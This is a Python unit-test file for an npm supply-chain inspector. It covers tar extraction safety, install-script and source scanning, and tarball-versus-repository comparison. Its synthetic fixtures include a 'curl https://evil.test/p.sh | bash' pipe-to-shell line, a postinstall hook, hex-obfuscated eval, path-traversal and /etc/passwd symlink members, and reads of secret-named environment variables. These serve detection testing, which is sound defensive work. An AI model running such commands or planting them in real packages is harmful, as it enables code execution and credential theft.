#!/usr/bin/env python3
"""Offline tests for the inspector.

Every fixture is built in memory, so these run with no network and no real
package. That matters for a tool whose subject is hostile archives: the malicious
cases here are synthetic by design, and nothing that runs is downloaded.

    python3 -m unittest discover -s skills/supply-chain-audit/tests
"""

import io
import os
import sys
import tarfile
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

import inspect_package as inspector  # noqa: E402


def make_tarball(files, root="package"):
    """Build a .tar.gz in memory from {relative path: text contents}."""
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for relative, contents in files.items():
            data = contents.encode("utf-8")
            info = tarfile.TarInfo(f"{root}/{relative}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def extract_to_temp(archive_bytes):
    workspace = tempfile.mkdtemp()
    inspector.safe_extract(archive_bytes, workspace)
    return inspector.package_root(workspace)


def checks(findings):
    return {finding["check"] for finding in findings}


def severity_of(findings, check):
    for finding in findings:
        if finding["check"] == check:
            return finding["severity"]
    return None


class SafeExtractionTests(unittest.TestCase):
    """The archive is attacker-controlled. Unpacking it must not be exploitable."""

    def test_rejects_path_traversal(self):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            payload = b"owned"
            info = tarfile.TarInfo("../../escaped.txt")
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))

        with tempfile.TemporaryDirectory() as workspace:
            outside = os.path.join(os.path.dirname(workspace), "escaped.txt")
            inspector.safe_extract(buffer.getvalue(), workspace)
            self.assertFalse(os.path.exists(outside), "traversal member was extracted")

    def test_rejects_absolute_paths(self):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            payload = b"owned"
            info = tarfile.TarInfo("/tmp/portcullis-absolute-probe.txt")
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))

        with tempfile.TemporaryDirectory() as workspace:
            extracted = inspector.safe_extract(buffer.getvalue(), workspace)
            self.assertEqual(extracted, 0)

    def test_skips_symlinks(self):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            link = tarfile.TarInfo("package/passwd-link")
            link.type = tarfile.SYMTYPE
            link.linkname = "/etc/passwd"
            tar.addfile(link)
            payload = b"{}"
            info = tarfile.TarInfo("package/package.json")
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))

        with tempfile.TemporaryDirectory() as workspace:
            inspector.safe_extract(buffer.getvalue(), workspace)
            self.assertFalse(os.path.lexists(os.path.join(workspace, "package", "passwd-link")))

    def test_extracts_ordinary_members(self):
        archive = make_tarball({"package.json": "{}", "index.js": "module.exports = 1;"})
        with tempfile.TemporaryDirectory() as workspace:
            self.assertEqual(inspector.safe_extract(archive, workspace), 2)


class ManifestTests(unittest.TestCase):
    def test_flags_postinstall_as_high(self):
        root = extract_to_temp(
            make_tarball({"package.json": '{"name":"x","scripts":{"postinstall":"node evil.js"}}'})
        )
        findings, _ = inspector.check_manifest(root)
        self.assertEqual(severity_of(findings, "install_script"), "high")
        self.assertIn("node evil.js", findings[0]["evidence"])

    def test_native_build_is_only_medium(self):
        root = extract_to_temp(
            make_tarball({"package.json": '{"name":"x","scripts":{"install":"node-gyp rebuild"}}'})
        )
        findings, _ = inspector.check_manifest(root)
        self.assertEqual(severity_of(findings, "install_script"), "medium")

    def test_clean_manifest_is_silent(self):
        root = extract_to_temp(
            make_tarball({"package.json": '{"name":"x","scripts":{"test":"jest"}}'})
        )
        findings, _ = inspector.check_manifest(root)
        self.assertEqual(findings, [])

    def test_unparseable_manifest_is_reported_not_raised(self):
        root = extract_to_temp(make_tarball({"package.json": "{not json"}))
        findings, manifest = inspector.check_manifest(root)
        self.assertEqual(checks(findings), {"manifest"})
        self.assertEqual(manifest, {})


class SourceScanTests(unittest.TestCase):
    def test_detects_pipe_to_shell_as_critical(self):
        root = extract_to_temp(
            make_tarball(
                {
                    "package.json": "{}",
                    "setup.js": 'exec("curl https://evil.test/p.sh | bash");',
                }
            )
        )
        findings, _ = inspector.scan_sources(root)
        self.assertEqual(severity_of(findings, "pipe_to_shell"), "critical")

    def test_detects_process_execution(self):
        root = extract_to_temp(
            make_tarball({"package.json": "{}", "run.js": 'var cp = require("child_process");'})
        )
        findings, _ = inspector.scan_sources(root)
        self.assertIn("process_execution", checks(findings))

    def test_detects_dense_hex_escapes_outside_build_dirs(self):
        payload = "".join(f"\\x{byte:02x}" for byte in range(60))
        root = extract_to_temp(make_tarball({"package.json": "{}", "a.js": f'var s = "{payload}";'}))
        findings, _ = inspector.scan_sources(root)
        self.assertIn("obfuscation", checks(findings))

    def test_ignores_minified_build_output(self):
        payload = "".join(f"\\x{byte:02x}" for byte in range(60))
        root = extract_to_temp(
            make_tarball({"package.json": "{}", "dist/bundle.min.js": f'eval("{payload}");'})
        )
        findings, _ = inspector.scan_sources(root)
        self.assertNotIn("obfuscation", checks(findings))
        self.assertNotIn("dynamic_eval", checks(findings))

    def test_ignores_type_declarations(self):
        """Nothing in a .d.ts runs, so a URL in one is documentation, not egress."""
        root = extract_to_temp(
            make_tarball(
                {
                    "package.json": "{}",
                    "index.d.ts": "/** See https://en.wikipedia.org/wiki/ANSI */\nexport {};",
                }
            )
        )
        findings, scanned = inspector.scan_sources(root)
        self.assertEqual(findings, [])
        self.assertEqual(scanned, 0)

    def test_single_env_read_is_not_harvesting(self):
        root = extract_to_temp(
            make_tarball({"package.json": "{}", "a.js": "var e = process.env.NODE_ENV;"})
        )
        findings, _ = inspector.scan_sources(root)
        self.assertNotIn("env_harvest", checks(findings))

    def test_several_env_reads_are_harvesting(self):
        source = "\n".join(
            f"var v{i} = process.env.{name};"
            for i, name in enumerate(["AWS_SECRET_KEY", "NPM_TOKEN", "GITHUB_TOKEN", "SSH_KEY"])
        )
        root = extract_to_temp(make_tarball({"package.json": "{}", "a.js": source}))
        findings, _ = inspector.scan_sources(root)
        self.assertIn("env_harvest", checks(findings))

    def test_flags_shipped_binaries(self):
        root = extract_to_temp(make_tarball({"package.json": "{}", "bin/tool.node": "binary"}))
        findings, _ = inspector.scan_sources(root)
        self.assertIn("binary_artifact", checks(findings))


class SourceComparisonTests(unittest.TestCase):
    """The check that matters most: code that ships but was never reviewed."""

    def test_tarball_only_file_is_critical_when_repo_has_no_build_step(self):
        npm_root = extract_to_temp(
            make_tarball({"package.json": "{}", "index.js": "ok", "smuggled.js": "payload"})
        )
        repo = make_tarball({"package.json": "{}", "index.js": "ok"}, root="repo-1.0.0")
        findings, stats = inspector.compare_with_source(npm_root, repo)

        self.assertEqual(severity_of(findings, "tarball_only_source"), "critical")
        self.assertFalse(stats["repo_has_build_step"])
        self.assertEqual([f["path"] for f in findings], ["smuggled.js"])

    def test_tarball_only_file_is_downgraded_when_the_repo_builds(self):
        """A project that compiles may rename as it publishes, so the claim softens."""
        npm_root = extract_to_temp(
            make_tarball({"package.json": "{}", "index.js": "ok", "renamed.js": "compiled"})
        )
        repo = make_tarball(
            {"package.json": "{}", "tsconfig.json": "{}", "src/index.ts": "ok"},
            root="repo-1.0.0",
        )
        findings, stats = inspector.compare_with_source(npm_root, repo)

        self.assertTrue(stats["repo_has_build_step"])
        self.assertEqual(severity_of(findings, "tarball_only_source"), "medium")

    def test_compiled_counterpart_is_not_reported(self):
        npm_root = extract_to_temp(make_tarball({"package.json": "{}", "index.js": "compiled"}))
        repo = make_tarball({"package.json": "{}", "src/index.ts": "source"}, root="repo-1.0.0")
        findings, stats = inspector.compare_with_source(npm_root, repo)

        self.assertEqual(findings, [])
        self.assertEqual(stats["compiled_from_source_files"], 1)

    def test_matching_tarball_and_repo_produce_nothing(self):
        npm_root = extract_to_temp(make_tarball({"package.json": "{}", "index.js": "ok"}))
        repo = make_tarball({"package.json": "{}", "index.js": "ok"}, root="repo-1.0.0")
        findings, _ = inspector.compare_with_source(npm_root, repo)
        self.assertEqual(findings, [])


class SummaryTests(unittest.TestCase):
    def test_highest_severity_wins(self):
        summary = inspector.summarise(
            [
                inspector.Finding("a", "low", "x"),
                inspector.Finding("b", "critical", "x"),
                inspector.Finding("c", "medium", "x"),
            ]
        )
        self.assertEqual(summary["highest_severity"], "critical")
        self.assertEqual(summary["total"], 3)

    def test_no_findings_has_no_severity(self):
        self.assertIsNone(inspector.summarise([])["highest_severity"])


class RepoSlugTests(unittest.TestCase):
    def test_parses_the_usual_repository_url_shapes(self):
        for url in (
            "https://github.com/expressjs/express",
            "https://github.com/expressjs/express.git",
            "git+https://github.com/expressjs/express.git",
            "git@github.com:expressjs/express.git",
        ):
            self.assertEqual(inspector.repo_slug(url), ("expressjs", "express"), url)

    def test_returns_none_for_non_github(self):
        self.assertIsNone(inspector.repo_slug("https://gitlab.com/a/b"))
        self.assertIsNone(inspector.repo_slug(None))


if __name__ == "__main__":
    unittest.main(verbosity=2)
